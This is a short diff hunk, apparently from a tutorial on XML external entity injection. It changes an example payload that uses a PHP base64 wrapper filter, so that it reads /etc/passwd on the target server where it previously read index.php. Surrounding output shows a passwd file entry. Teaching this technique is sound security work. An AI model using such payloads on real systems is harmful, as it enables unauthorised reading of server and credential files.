@@ -25,7 +25,7 @@ bin:x:2:2:bin:/bin:/usr/sbin/nologin
 Additionally, if the target is a PHP application, we can use wrapper filters to encode the content using Base64. For example:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE haxxor [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<!DOCTYPE haxxor [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd"> ]>
 <stockCheck><productId>&xxe;</productId></stockCheck>
 ```
 ## Note
